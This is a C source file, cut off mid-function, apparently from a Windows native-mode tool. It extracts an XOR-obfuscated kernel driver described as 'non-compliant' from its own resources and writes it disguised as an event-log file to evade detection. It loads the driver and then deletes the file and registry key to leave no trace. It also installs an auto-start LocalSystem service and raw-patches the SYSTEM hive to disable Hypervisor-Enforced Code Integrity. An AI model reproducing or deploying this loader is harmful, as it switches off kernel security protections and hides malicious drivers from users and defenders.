// ============================================================================
// SetupManager — resource extraction, HVCI hive patching, cleanup (BB variant)
//
// DRIVER DEPLOYMENT (BB-specific):
//   kvc.sys is NOT distributed as a separate file — it is embedded directly
//   in the kvc_smss.exe PE binary as resource IDR_DRV1 (type 10, id 101).
//
//   Payload encoding pipeline (build time):
//     raw kvc.sys → LZNT1 compress → XOR with XOR_KEY (7-byte rotating key)
//     → stored as PE RCDATA resource
//
//   Extraction pipeline (runtime, in ExtractkvcFromResource):
//     FindResourceData(IDR_DRV1) → XOR decrypt → RtlDecompressBuffer(LZNT1)
//     → NtCreateFile to kvc_Log (Sam.evtx) → LoadDriver → Cleanupkvc
//
//   The .evtx extension disguises the driver binary as a Windows event log
//   in the WinEvt\Logs directory to avoid trivial file-system detection.
//
// HVCI PATCH STRATEGY (same as kvc_smss variant):
//   Opens the live SYSTEM hive file as raw binary and rewrites the
//   HypervisorEnforcedCodeIntegrity\Enabled VK cell inline.  Safe at SMSS
//   phase because the hive is not yet mapped read-only.  Change takes effect
//   only after a reboot.  See PatchSystemHiveHVCI for NK/VK walk details.
// ============================================================================

#include "SetupManager.h"
#include "DriverManager.h"

extern PWSTR MmGetPoolDiagnosticString(void);

// Resource IDs for embedded payloads (RCDATA, type 10).
#define IDR_DRV1                 101   // kvc.sys kernel driver
#define IDR_DRV2                 102   // HvciShutdownSvc.exe HVCI Shutdown Service
// Exact size of the XOR+LZNT1-compressed payload stored in the resource section.
#define kvc_SIZE              9139
// Exact size of kvc.sys after LZNT1 decompression — used to validate integrity.
#define kvc_UNCOMPRESSED_SIZE 14024
// Compressed size of HvciShutdownSvc.exe (XOR+LZNT1) — deterministic, rebuild if binary changes.
#define HvciShutdownSvc_SIZE              1759
// Uncompressed size of HvciShutdownSvc.exe — used to validate decompression integrity.
#define HvciShutdownSvc_UNCOMPRESSED_SIZE 4096

// 1 MB chunk size is optimal for Native I/O operations.
#define SCAN_CHUNK_SIZE (1024 * 1024)
// Safety margin keeps the full NK header available when a match lands near a chunk edge.
#define OVERLAP_SIZE    (256)
// All hive offsets are relative to the 0x1000-byte base header.
#define HIVE_BIN_BASE   (0x1000ULL)
#define HIVE_MAX_VALUES (256)
#define HIVE_NK_NAME_OFFSET          (0x4C)    // byte offset of KeyName within an NK cell
#define HIVE_NK_VALUES_COUNT_DELTA   (40)       // bytes before KeyName → ValuesCount
#define HIVE_NK_VALUES_LIST_DELTA    (36)       // bytes before KeyName → ValuesListOffset
// Inline REG_DWORD: high bit of DataLength set + DataLength == 4.
#define HIVE_VK_INLINE_DWORD         (0x80000000UL | sizeof(ULONG))
#define HIVE_VK_FIXED_SIZE           (24)       // fixed header size of a VK cell

// 7-byte rotating XOR key applied to the compressed payload.
// Key is chosen to avoid null bytes in the encrypted stream (PE resource section
// cannot store embedded NULs in some linker toolchains).
static const UCHAR XOR_KEY[] = { 0xA0, 0xE2, 0x80, 0x8B, 0xE2, 0x80, 0x8C };
static const SIZE_T XOR_KEY_LEN = sizeof(XOR_KEY);

// ============================================================================
// RESOURCE EXTRACTION
// ============================================================================

// Locates the PE resource data entry for resourceId (type 10 / RCDATA).
// Walks the in-memory resource directory starting from the process image base,
// which is read from the PEB (GS:[0x60]+0x10 on x64).
// Returns a pointer into the mapped PE image (read-only) and sets *outSize.
// Returns NULL if the resource section is absent or the ID is not found.
PVOID FindResourceData(ULONG resourceId, PULONG outSize) {
    PVOID imageBase = NULL;

    #ifdef _M_X64
        imageBase = (PVOID)*(ULONGLONG*)((UCHAR*)__readgsqword(0x60) + 0x10);
    #else
        imageBase = (PVOID)*(ULONG*)((UCHAR*)__readfsdword(0x30) + 0x08);
    #endif

    if (!imageBase) {
        DEBUG_LOG(L"DEBUG: Cannot get image base\r\n");
        return NULL;
    }

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)imageBase;
    if (dosHeader->e_magic != 0x5A4D) {
        DEBUG_LOG(L"DEBUG: Invalid DOS header\r\n");
        return NULL;
    }

    PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)((UCHAR*)imageBase + dosHeader->e_lfanew);
    if (ntHeaders->Signature != 0x4550) {
        DEBUG_LOG(L"DEBUG: Invalid PE signature\r\n");
        return NULL;
    }

    PIMAGE_DATA_DIRECTORY resourceDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE];
    if (resourceDir->Size == 0) {
        DEBUG_LOG(L"DEBUG: No resource directory\r\n");
        return NULL;
    }

    PIMAGE_RESOURCE_DIRECTORY resRoot = (PIMAGE_RESOURCE_DIRECTORY)((UCHAR*)imageBase + resourceDir->VirtualAddress);
    PIMAGE_RESOURCE_DIRECTORY_ENTRY resEntry = (PIMAGE_RESOURCE_DIRECTORY_ENTRY)(resRoot + 1);

    for (ULONG i = 0; i < (ULONG)(resRoot->NumberOfNamedEntries + resRoot->NumberOfIdEntries); i++) {
        if (!resEntry[i].NameIsString && resEntry[i].Id == 10) {
            PIMAGE_RESOURCE_DIRECTORY typeDir = (PIMAGE_RESOURCE_DIRECTORY)((UCHAR*)resRoot + (resEntry[i].OffsetToDirectory & 0x7FFFFFFF));
            PIMAGE_RESOURCE_DIRECTORY_ENTRY typeEntry = (PIMAGE_RESOURCE_DIRECTORY_ENTRY)(typeDir + 1);

            for (ULONG j = 0; j < (ULONG)(typeDir->NumberOfNamedEntries + typeDir->NumberOfIdEntries); j++) {
                if (!typeEntry[j].NameIsString && typeEntry[j].Id == resourceId) {
                    PIMAGE_RESOURCE_DIRECTORY nameDir = (PIMAGE_RESOURCE_DIRECTORY)((UCHAR*)resRoot + (typeEntry[j].OffsetToDirectory & 0x7FFFFFFF));
                    PIMAGE_RESOURCE_DIRECTORY_ENTRY nameEntry = (PIMAGE_RESOURCE_DIRECTORY_ENTRY)(nameDir + 1);

                    if (nameDir->NumberOfIdEntries > 0) {
                        PIMAGE_RESOURCE_DATA_ENTRY dataEntry = (PIMAGE_RESOURCE_DATA_ENTRY)((UCHAR*)resRoot + nameEntry[0].OffsetToData);
                        *outSize = dataEntry->Size;
                        return (PVOID)((UCHAR*)imageBase + dataEntry->OffsetToData);
                    }
                }
            }
        }
    }

    return NULL;
}

// Extracts kvc.sys from the embedded PE resource, writes it to kvc_Log, and
// returns TRUE when the file is ready for LoadDriver.
//
// Idempotency: if the driver is already loaded from a previous call, the
// function unloads it, removes the registry key, and deletes the old file
// before extracting a fresh copy.  This handles re-entry after a partial run.
//
// Failure paths: returns FALSE and leaves kvc_Log absent if resource is
// missing, size mismatches, decompression fails, or file write fails.
BOOLEAN ExtractkvcFromResource(void) {
    PWSTR driverName = MmGetPoolDiagnosticString();

    // Cleanup any leftover state from previous run
    if (IsDriverLoaded(driverName)) {
        DEBUG_LOG(L"INFO: kvc already loaded, unloading...\r\n");

        WCHAR fullServicePath[MAX_PATH_LEN];
        UNICODE_STRING usServiceName;

        SIZE_T baseLen = wcscpy_safe(fullServicePath, MAX_PATH_LEN,
                                      L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\");
        if (baseLen < MAX_PATH_LEN - 1) {
            if (wcscat_safe(fullServicePath, MAX_PATH_LEN, driverName) < MAX_PATH_LEN) {
                RtlInitUnicodeString(&usServiceName, fullServicePath);
                NtUnloadDriver(&usServiceName);
            }
        }

        // Delete leftover registry key
        OBJECT_ATTRIBUTES oaKey;
        HANDLE hKey;
        UNICODE_STRING usKeyPath;
        wcscpy_safe(fullServicePath, MAX_PATH_LEN,
                    L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\");
        wcscat_safe(fullServicePath, MAX_PATH_LEN, driverName);
        RtlInitUnicodeString(&usKeyPath, fullServicePath);
        InitializeObjectAttributes(&oaKey, &usKeyPath, OBJ_CASE_INSENSITIVE, NULL, NULL);
        if (NT_SUCCESS(NtOpenKey(&hKey, DELETE, &oaKey))) {
            NtDeleteKey(hKey);
            NtClose(hKey);
        }

        // Delete leftover file
        UNICODE_STRING usFilePath;
        OBJECT_ATTRIBUTES oaFile;
        IO_STATUS_BLOCK iosb;
        HANDLE hFile;
        FILE_DISPOSITION_INFORMATION dispInfo;
        RtlInitUnicodeString(&usFilePath, kvc_Log);
        InitializeObjectAttributes(&oaFile, &usFilePath, OBJ_CASE_INSENSITIVE, NULL, NULL);
        if (NT_SUCCESS(NtOpenFile(&hFile, DELETE | SYNCHRONIZE, &oaFile, &iosb,
                                  FILE_SHARE_DELETE, FILE_SYNCHRONOUS_IO_NONALERT))) {
            dispInfo.DeleteFile = TRUE;
            NtSetInformationFile(hFile, &iosb, &dispInfo, sizeof(dispInfo), 13);
            NtClose(hFile);
        }

        DEBUG_LOG(L"INFO: Previous kvc state cleaned\r\n");
    }

    ULONG resourceSize = 0;
    PVOID resourceData = FindResourceData(IDR_DRV1, &resourceSize);

    if (!resourceData || resourceSize != kvc_SIZE) {
        DisplayMessage(L"FAILED: Cannot find non-compliant driver resource\r\n");
        return FALSE;
    }

    DEBUG_LOG(L"INFO: Extracting non-compliant driver from resource...\r\n");

    UCHAR xorBuf[kvc_SIZE];
    UCHAR decompBuf[kvc_UNCOMPRESSED_SIZE];
    ULONG finalSize = 0;
    NTSTATUS status;

    // XOR decrypt
    UCHAR* srcData = (UCHAR*)resourceData;
    for (SIZE_T i = 0; i < kvc_SIZE; i++) {
        xorBuf[i] = srcData[i] ^ XOR_KEY[i % XOR_KEY_LEN];
    }

    // LZNT1 decompress
    status = RtlDecompressBuffer(COMPRESSION_FORMAT_LZNT1,
                                 decompBuf, kvc_UNCOMPRESSED_SIZE,
                                 xorBuf, kvc_SIZE,
                                 &finalSize);

    if (!NT_SUCCESS(status) || finalSize != kvc_UNCOMPRESSED_SIZE) {
        DisplayMessage(L"FAILED: Cannot decompress driver resource");
        DisplayStatus(status);
        return FALSE;
    }

    UNICODE_STRING usFilePath;
    OBJECT_ATTRIBUTES oa;
    IO_STATUS_BLOCK iosb;
    HANDLE hFile;
    LARGE_INTEGER byteOffset;

    RtlInitUnicodeString(&usFilePath, kvc_Log);
    InitializeObjectAttributes(&oa, &usFilePath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NtCreateFile(&hFile, FILE_WRITE_DATA | SYNCHRONIZE, &oa, &iosb,
                         NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_OVERWRITE_IF,
                         FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);

    if (!NT_SUCCESS(status)) {
        DisplayMessage(L"FAILED: Cannot create temporary driver file");
        DisplayStatus(status);
        return FALSE;
    }

    byteOffset.QuadPart = 0;
    status = NtWriteFile(hFile, NULL, NULL, NULL, &iosb, decompBuf,
                        kvc_UNCOMPRESSED_SIZE, &byteOffset, NULL);

    NtClose(hFile);

    if (!NT_SUCCESS(status)) {
        DisplayMessage(L"FAILED: Cannot write driver file");
        DisplayStatus(status);
        return FALSE;
    }

    DEBUG_LOG(L"SUCCESS: Non-compliant driver extracted to system.evtx\r\n");
    return TRUE;
}

// ============================================================================
// HvciShutdownSvc SERVICE DEPLOYMENT
// Extracts HvciShutdownSvc.exe from resource IDR_DRV2 and registers HVCIShutdownSvc so
// that the SCM starts it automatically on next and every subsequent boot.
//
// Deployment pipeline (build time):
//   raw HvciShutdownSvc.exe -> LZNT1 compress -> XOR with XOR_KEY -> IDR_DRV2 resource
//
// Extraction pipeline (runtime, here):
//   FindResourceData(IDR_DRV2) -> XOR decrypt -> RtlDecompressBuffer(LZNT1)
//   -> NtCreateFile to \SystemRoot\System32\HvciShutdownSvc.exe
//   -> NtCreateKey  \Registry\Machine\...\Services\HVCIShutdownSvc
//
// The function is idempotent: the file is opened with FILE_OVERWRITE_IF and
// the service key creation is non-fatal on STATUS_OBJECT_NAME_COLLISION.
// ============================================================================

// Destination path for the extracted service binary.
#define HvciShutdownSvc_DestPath  L"\\SystemRoot\\System32\\HvciShutdownSvc.exe"
// ImagePath value stored in the service key (REG_EXPAND_SZ, SCM-expanded).
#define HvciShutdownSvc_ImagePath L"%SystemRoot%\\System32\\HvciShutdownSvc.exe"
// Human-readable name stored in the service key.
#define HvciShutdownSvc_DisplayName L"HVCI Shutdown Service"
// SCM service name (must match the name compiled into HvciShutdownSvc.exe).
#define HvciShutdownSvc_ServiceName L"HVCIShutdownSvc"

BOOLEAN ExtractHvciShutdownSvcAndRegisterService(void) {
    ULONG resourceSize = 0;
    PVOID resourceData = FindResourceData(IDR_DRV2, &resourceSize);

    if (!resourceData || resourceSize != HvciShutdownSvc_SIZE) {
        DisplayMessage(L"FAILED: Cannot find HvciShutdownSvc.exe resource (IDR_DRV2)\r\n");
        return FALSE;
    }

    DEBUG_LOG(L"INFO: Extracting HvciShutdownSvc.exe from resource IDR_DRV2...\r\n");

    UCHAR xorBuf[HvciShutdownSvc_SIZE];
    UCHAR decompBuf[HvciShutdownSvc_UNCOMPRESSED_SIZE];
    ULONG finalSize = 0;
    NTSTATUS status;

    // XOR decrypt (same key as IDR_DRV1)
    UCHAR* srcData = (UCHAR*)resourceData;
    for (SIZE_T i = 0; i < HvciShutdownSvc_SIZE; i++) {
        xorBuf[i] = srcData[i] ^ XOR_KEY[i % XOR_KEY_LEN];
    }

    // LZNT1 decompress
    status = RtlDecompressBuffer(COMPRESSION_FORMAT_LZNT1,
                                 decompBuf, HvciShutdownSvc_UNCOMPRESSED_SIZE,
                                 xorBuf, HvciShutdownSvc_SIZE,
                                 &finalSize);

    if (!NT_SUCCESS(status) || finalSize != HvciShutdownSvc_UNCOMPRESSED_SIZE) {
        DisplayMessage(L"FAILED: Cannot decompress HvciShutdownSvc.exe resource");
        DisplayStatus(status);
        return FALSE;
    }

    // Write HvciShutdownSvc.exe to System32
    UNICODE_STRING usFilePath;
    OBJECT_ATTRIBUTES oa;
    IO_STATUS_BLOCK iosb;
    HANDLE hFile;
    LARGE_INTEGER byteOffset;

    RtlInitUnicodeString(&usFilePath, HvciShutdownSvc_DestPath);
    InitializeObjectAttributes(&oa, &usFilePath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NtCreateFile(&hFile, FILE_WRITE_DATA | SYNCHRONIZE, &oa, &iosb,
                         NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_OVERWRITE_IF,
                         FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);

    if (!NT_SUCCESS(status)) {
        DisplayMessage(L"FAILED: Cannot create System32\\HvciShutdownSvc.exe");
        DisplayStatus(status);
        return FALSE;
    }

    byteOffset.QuadPart = 0;
    status = NtWriteFile(hFile, NULL, NULL, NULL, &iosb, decompBuf,
                        HvciShutdownSvc_UNCOMPRESSED_SIZE, &byteOffset, NULL);
    NtClose(hFile);

    if (!NT_SUCCESS(status)) {
        DisplayMessage(L"FAILED: Cannot write System32\\HvciShutdownSvc.exe");
        DisplayStatus(status);
        return FALSE;
    }

    DEBUG_LOG(L"SUCCESS: HvciShutdownSvc.exe extracted to System32\r\n");

    // Create SCM service registry key for HVCIShutdownSvc
    // Type  = 0x10  SERVICE_WIN32_OWN_PROCESS
    // Start = 0x02  SERVICE_AUTO_START
    // ErrorControl = 0x01  SERVICE_ERROR_NORMAL
    WCHAR svcKeyPath[MAX_PATH_LEN];
    UNICODE_STRING usKeyPath, usValueName;
    OBJECT_ATTRIBUTES oaKey;
    HANDLE hKey = NULL;
    ULONG disposition;
    DWORD dwValue;
    ULONG dataSize;

    if (wcscpy_safe(svcKeyPath, MAX_PATH_LEN,
                    L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\")
        >= MAX_PATH_LEN - 1) {
        DisplayMessage(L"WARNING: HvciShutdownSvc service key path too long\r\n");
        return TRUE;  // file was written successfully; key failure is non-fatal
    }
    if (wcscat_safe(svcKeyPath, MAX_PATH_LEN, HvciShutdownSvc_ServiceName) >= MAX_PATH_LEN) {
        DisplayMessage(L"WARNING: HvciShutdownSvc service key path truncated\r\n");
        return TRUE;
    }

    RtlInitUnicodeString(&usKeyPath, svcKeyPath);
    InitializeObjectAttributes(&oaKey, &usKeyPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NtCreateKey(&hKey, KEY_ALL_ACCESS, &oaKey, 0, NULL,
                         REG_OPTION_NON_VOLATILE, &disposition);

    if (!NT_SUCCESS(status)) {
        // Non-fatal: if the key already exists and NtCreateKey returned an error
        // other than COLLISION (which should not happen), just log and continue.
        DisplayMessage(L"WARNING: Cannot create HVCIShutdownSvc key");
        DisplayStatus(status);
        return TRUE;
    }

    // ImagePath — REG_EXPAND_SZ — SCM expands %SystemRoot% at start time
    RtlInitUnicodeString(&usValueName, L"ImagePath");
    dataSize = (ULONG)((wcslen(HvciShutdownSvc_ImagePath) + 1) * sizeof(WCHAR));
    NtSetValueKey(hKey, &usValueName, 0, REG_EXPAND_SZ, (PVOID)HvciShutdownSvc_ImagePath, dataSize);
	
	// DisplayName — REG_SZ
    RtlInitUnicodeString(&usValueName, L"DisplayName");
    dataSize = (ULONG)((wcslen(HvciShutdownSvc_DisplayName) + 1) * sizeof(WCHAR));
    NtSetValueKey(hKey, &usValueName, 0, REG_SZ, (PVOID)HvciShutdownSvc_DisplayName, dataSize);

    // ObjectName — REG_SZ
    RtlInitUnicodeString(&usValueName, L"ObjectName");
    dataSize = (ULONG)((wcslen(L"LocalSystem") + 1) * sizeof(WCHAR));
    NtSetValueKey(hKey, &usValueName, 0, REG_SZ, (PVOID)L"LocalSystem", dataSize);

	// Type — REG_DWORD — 0x10 = SERVICE_WIN32_OWN_PROCESS
    RtlInitUnicodeString(&usValueName, L"Type");
    dwValue = 0x10;
    NtSetValueKey(hKey, &usValueName, 0, REG_DWORD, &dwValue, sizeof(DWORD));
    // Start — REG_DWORD — 0x02 = SERVICE_AUTO_START
    RtlInitUnicodeString(&usValueName, L"Start");
    dwValue = 0x02;
    NtSetValueKey(hKey, &usValueName, 0, REG_DWORD, &dwValue, sizeof(DWORD));
	
    // ErrorControl — REG_DWORD — 0x01 = SERVICE_ERROR_NORMAL
    RtlInitUnicodeString(&usValueName, L"ErrorControl");
    dwValue = 0x01;
    NtSetValueKey(hKey, &usValueName, 0, REG_DWORD, &dwValue, sizeof(DWORD));

    NtClose(hKey);

    DEBUG_LOG(L"SUCCESS: HVCIShutdownSvc service key ready\r\n");

    return TRUE;
}

// ============================================================================
// POST-LOAD CLEANUP
// Removes both the temporary driver file (kvc_Log / Sam.evtx) AND the SCM
// registry key created by LoadDriver.  Both must be deleted to leave no trace.
// Idempotent: missing file or key is not treated as an error.
// ============================================================================

// Deletes kvc_Log and HKLM\...\Services\<obfuscated-name>.
// Called by ExecuteAutoPatchLoad after the driver is unloaded (step 5).
NTSTATUS Cleanupkvc(void) {
    UNICODE_STRING usFilePath;
    UNICODE_STRING usServiceName;
    OBJECT_ATTRIBUTES oa;
    IO_STATUS_BLOCK iosb;
    HANDLE hFile;
    HANDLE hKey;
    FILE_DISPOSITION_INFORMATION dispInfo;
    NTSTATUS status;
    WCHAR fullServicePath[MAX_PATH_LEN];
    PWSTR driverName = MmGetPoolDiagnosticString();

    RtlInitUnicodeString(&usFilePath, kvc_Log);
    InitializeObjectAttributes(&oa, &usFilePath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

    status = NtOpenFile(&hFile, DELETE | SYNCHRONIZE, &oa, &iosb,
                       FILE_SHARE_DELETE, FILE_SYNCHRONOUS_IO_NONALERT);

    if (NT_SUCCESS(status)) {
        dispInfo.DeleteFile = TRUE;
        NtSetInformationFile(hFile, &iosb, &dispInfo, sizeof(dispInfo), 13);
        NtClose(hFile);
        DEBUG_LOG(L"INFO: Temporary driver file deleted\r\n");
    }

    SIZE_T baseLen = wcscpy_safe(fullServicePath, MAX_PATH_LEN,
                                  L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\");
    if (baseLen >= MAX_PATH_LEN - 1) {
        DEBUG_LOG(L"WARNING: Service path too long for cleanup\r\n");
        return STATUS_OBJECT_NAME_INVALID;
    }

    SIZE_T finalLen = wcscat_safe(fullServicePath, MAX_PATH_LEN, driverName);
    if (finalLen >= MAX_PATH_LEN) {
        DEBUG_LOG(L"WARNING: Service path truncated during cleanup\r\n");
        return STATUS_OBJECT_NAME_INVALID;
    }

    RtlInitUnicodeString(&usServiceName, fullServicePath);
    InitializeObjectAttributes(&oa, &usServiceName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NtOpenKey(&hKey, DELETE, &oa);
    if (NT_SUCCESS(status)) {
        NtDeleteKey(hKey);
        NtClose(hKey);
        DEBUG_LOG(L"INFO: Driver registry key cleaned up\r\n");
    }

    return STATUS_SUCCESS;
}

// Naive exact byte-pattern search.  Returns the offset of the first match
// within buffer[0..bufferSize-1], or (SIZE_T)-1 if not found.
// Used for the NK key-name search in the hive scanner.
SIZE_T FindPatternInBuffer(PUCHAR buffer, SIZE_T bufferSize, PUCHAR pattern, SIZE_T patternSize) {
    for (SIZE_T i = 0; i <= bufferSize - patternSize; i++) {
        BOOLEAN match = TRUE;
        for (SIZE_T j = 0; j < patternSize; j++) {
            if (buffer[i + j] != pattern[j]) {
                match = FALSE;
                break;
            }
        }
        if (match) return i;
    }
    return (SIZE_T)-1;
}

static ULONG ReadLeUlong(PUCHAR buffer) {
    return ((ULONG)buffer[0]) |
           ((ULONG)buffer[1] << 8) |
           ((ULONG)buffer[2] << 16) |
           ((ULONG)buffer[3] << 24);
}

static USHORT ReadLeUshort(PUCHAR buffer) {
    return (USHORT)(((ULONG)buffer[0]) |
                    ((ULONG)buffer[1] << 8));
}

// Returns TRUE if the VK cell name is "Enabled".
// Handles both narrow (ASCII, flags bit 0 set) and wide (Unicode, flags bit 0
// clear) name encoding — the SYSTEM hive uses narrow names, but the function
// accepts either for robustness.
static BOOLEAN VkNameMatchesEnabled(PUCHAR vkBuffer, ULONG bytesAvailable, USHORT nameLength, USHORT flags) {
    static const char enabledName[] = "Enabled";

    if ((flags & 0x0001) != 0) {
        if (nameLength != 7 || bytesAvailable < ((ULONG)HIVE_VK_FIXED_SIZE + (ULONG)nameLength)) {
            return FALSE;
        }

        for (ULONG i = 0; i < 7; i++) {
            if (vkBuffer[HIVE_VK_FIXED_SIZE + i] != (UCHAR)enabledName[i]) {
                return FALSE;
            }
        }

        return TRUE;
    }

    if (nameLength != (7 * sizeof(WCHAR)) ||
        bytesAvailable < ((ULONG)HIVE_VK_FIXED_SIZE + (ULONG)nameLength)) {
        return FALSE;
    }

    for (ULONG i = 0; i < 7; i++) {
        if (ReadLeUshort(vkBuffer + HIVE_VK_FIXED_SIZE + (i * sizeof(WCHAR))) != (USHORT)enabledName[i]) {
            return FALSE;
        }
    }

    return TRUE;
}

// ============================================================================
// HIVE PATCHING (CHUNKED NK/VK WALK)
// ============================================================================

// Patches the HypervisorEnforcedCodeIntegrity\Enabled DWORD in the live SYSTEM
// hive file.  enable=TRUE sets value to 1 (re-enable HVCI on next boot);
// enable=FALSE sets value to 0 (disable HVCI on next boot).
//
// Returns TRUE if at least one VK was successfully patched or was already at
// the requested value.  Returns FALSE if the pattern is not found or I/O fails.
//
// NOTE: The hive file is written directly at the physical record level.
// Any in-memory registry views are NOT updated — the change takes effect only
// after a reboot when the kernel mounts the hive fresh from disk.
BOOLEAN PatchSystemHiveHVCI(BOOLEAN enable) {
    UNICODE_STRING usFilePath;
    OBJECT_ATTRIBUTES oa;
    IO_STATUS_BLOCK iosb;
    HANDLE hFile;
    NTSTATUS status;
    
    static UCHAR chunkBuffer[SCAN_CHUNK_SIZE]; 
    
    LARGE_INTEGER fileOffset;
    ULONG bytesRead;
    ULONG newValue = enable ? 1 : 0;

    // Pattern: "HypervisorEnforcedCodeIntegrity"
    static const UCHAR hvciPattern[31] = {
        0x48,0x79,0x70,0x65,0x72,0x76,0x69,0x73,0x6F,0x72,
        0x45,0x6E,0x66,0x6F,0x72,0x63,0x65,0x64,0x43,0x6F,
        0x64,0x65,0x49,0x6E,0x74,0x65,0x67,0x72,0x69,0x74,0x79
    };

    DEBUG_LOG(L"DEBUG: Opening SYSTEM hive (Chunked Mode)...\r\n");

    RtlInitUnicodeString(&usFilePath, L"\\SystemRoot\\System32\\config\\SYSTEM");
    InitializeObjectAttributes(&oa, &usFilePath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NtOpenFile(&hFile, FILE_READ_DATA | FILE_WRITE_DATA | SYNCHRONIZE, &oa, &iosb,
                       FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                       FILE_OPEN_FOR_BACKUP_INTENT | FILE_SYNCHRONOUS_IO_NONALERT);

    if (!NT_SUCCESS(status)) {
        DisplayMessage(L"FAILED: Cannot open SYSTEM hive");
        DisplayStatus(status);
        return FALSE;
    }

    // Query file size to control the scanning loop
    FILE_STANDARD_INFORMATION fileInfo;
    memset_impl(&fileInfo, 0, sizeof(fileInfo));
    status = NtQueryInformationFile(hFile, &iosb, &fileInfo, sizeof(fileInfo), FileStandardInformation);
    if (!NT_SUCCESS(status)) {
        NtClose(hFile);
        DisplayMessage(L"FAILED: Cannot query hive size");
        return FALSE;
    }

    ULONGLONG fileSize = (ULONGLONG)fileInfo.EndOfFile.QuadPart;
    ULONGLONG currentPos = 0;
    ULONG patchCount = 0;
    ULONG skipCount = 0;

    fileOffset.QuadPart = 0;

    // Main loop: chunk by chunk
    while (currentPos < fileSize) {
        
        // Read next file chunk (1 MB)
        status = NtReadFile(hFile, NULL, NULL, NULL, &iosb, chunkBuffer, SCAN_CHUNK_SIZE, &fileOffset, NULL);
        
        // Handle read errors or EOF scenarios
        if (!NT_SUCCESS(status)) {
             if (status == 0x103) {
                 // STATUS_PENDING - rare in sync mode
             } else if (status != 0x80000011) {
                 break; // Generic read error
             }
        }

        bytesRead = (ULONG)iosb.Information;
        if (bytesRead == 0) break;

        // In-chunk scanning
        SIZE_T searchStart = 0;
        
        while (searchStart < bytesRead) {
            // Find key name pattern in current chunk
            SIZE_T patternOffset = FindPatternInBuffer(chunkBuffer + searchStart, bytesRead - searchStart, (PUCHAR)hvciPattern, 31);
            
            if (patternOffset == (SIZE_T)-1) {
                break; // Not found in remainder of this chunk
            }
            
            patternOffset += searchStart; // Convert to chunk-relative offset

            // The key name must belong to an NK cell, not an adjacent VK/value blob.
            if (patternOffset < HIVE_NK_NAME_OFFSET ||
                chunkBuffer[patternOffset - HIVE_NK_NAME_OFFSET] != 0x6E ||
                chunkBuffer[patternOffset - HIVE_NK_NAME_OFFSET + 1] != 0x6B) {
                searchStart = patternOffset + 31;
                continue;
            }

            ULONG valuesCount = ReadLeUlong(chunkBuffer + patternOffset - HIVE_NK_VALUES_COUNT_DELTA);
            ULONG valuesListOffset = ReadLeUlong(chunkBuffer + patternOffset - HIVE_NK_VALUES_LIST_DELTA);

            if (valuesListOffset == 0xFFFFFFFF || valuesCount == 0 || valuesCount > HIVE_MAX_VALUES) {
                searchStart = patternOffset + 31;
                continue;
            }

            ULONGLONG valuesListFileOffset = HIVE_BIN_BASE + (ULONGLONG)valuesListOffset;
            ULONGLONG valuesListBytes = 4ULL + ((ULONGLONG)valuesCount * sizeof(ULONG));

            if (valuesListFileOffset + valuesListBytes > fileSize) {
                searchStart = patternOffset + 31;
                continue;
            }

            ULONG valueOffsets[HIVE_MAX_VALUES];
            IO_STATUS_BLOCK readIosb;
            LARGE_INTEGER valuesListReadOffset;
            valuesListReadOffset.QuadPart = valuesListFileOffset + 4; // Skip cell size.

            memset_impl(valueOffsets, 0, sizeof(valueOffsets));
            status = NtReadFile(hFile, NULL, NULL, NULL, &readIosb,
                                valueOffsets, valuesCount * sizeof(ULONG),
                                &valuesListReadOffset, NULL);
            if (!NT_SUCCESS(status) || readIosb.Information < (valuesCount * sizeof(ULONG))) {
                searchStart = patternOffset + 31;
                continue;
            }

            BOOLEAN foundEnabled = FALSE;

            for (ULONG valueIndex = 0; valueIndex < valuesCount; valueIndex++) {
                if (valueOffsets[valueIndex] == 0xFFFFFFFF) {
                    continue;
                }

                ULONGLONG vkFileOffset = HIVE_BIN_BASE + (ULONGLONG)valueOffsets[valueIndex];
                if (vkFileOffset + HIVE_VK_FIXED_SIZE > fileSize) {
                    continue;
                }

                UCHAR vkBuffer[64];
                IO_STATUS_BLOCK vkIosb;
                LARGE_INTEGER vkReadOffset;
                ULONG bytesToRead = sizeof(vkBuffer);

                if (vkFileOffset + bytesToRead > fileSize) {
                    bytesToRead = (ULONG)(fileSize - vkFileOffset);
                }

                vkReadOffset.QuadPart = vkFileOffset;
                memset_impl(vkBuffer, 0, sizeof(vkBuffer));

                status = NtReadFile(hFile, NULL, NULL, NULL, &vkIosb,
                                    vkBuffer, bytesToRead,
                                    &vkReadOffset, NULL);
                if (!NT_SUCCESS(status) || vkIosb.Information < HIVE_VK_FIXED_SIZE + 7) {
                    continue;
                }

                if (vkBuffer[4] != 0x76 || vkBuffer[5] != 0x6B) {
                    continue;
                }

                USHORT nameLength = ReadLeUshort(vkBuffer + 6);
                ULONG dataLength = ReadLeUlong(vkBuffer + 8);
                ULONG currentValue = ReadLeUlong(vkBuffer + 12);
                ULONG dataType = ReadLeUlong(vkBuffer + 16);
                USHORT valueFlags = ReadLeUshort(vkBuffer + 20);

                if (dataType != REG_DWORD || dataLength != HIVE_VK_INLINE_DWORD) {
                    continue;
                }

                if (!VkNameMatchesEnabled(vkBuffer, vkIosb.Information, nameLength, valueFlags)) {
                    continue;
                }

                if (currentValue != 0 && currentValue != 1) {
                    break;
                }

                foundEnabled = TRUE;

                if (currentValue == newValue) {
                    skipCount++;
                } else {
                    LARGE_INTEGER writeOffset;
                    LARGE_INTEGER verifyOffset;
                    IO_STATUS_BLOCK verifyIosb;
                    ULONG verifiedValue = 0xFFFFFFFF;
